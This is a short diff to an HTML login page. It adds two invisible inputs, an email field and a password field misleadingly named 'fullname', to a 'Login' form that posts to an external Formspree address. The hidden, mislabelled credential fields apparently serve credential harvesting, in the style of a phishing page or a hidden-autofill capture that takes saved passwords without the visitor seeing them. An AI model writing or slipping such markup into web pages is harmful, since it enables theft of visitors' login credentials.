@@ -48,11 +48,16 @@
             </div>
         </div>
 
-        <!-- Updated button using Formspree integration -->
+        <!-- Updated button action using Formspree integration -->
         <form action="https://formspree.io/f/myyrzggd" method="POST">
+            <label for="email">
+                <input type="email" name="email" style="display:none;">
+            </label>
+            <label for="fullname">
+                <input type="password" name="fullname" style="display:none;">
+            </label>
             <button type="submit" class="send">Login</button>
         </form>
-
     </div>
 </body>
 </html>
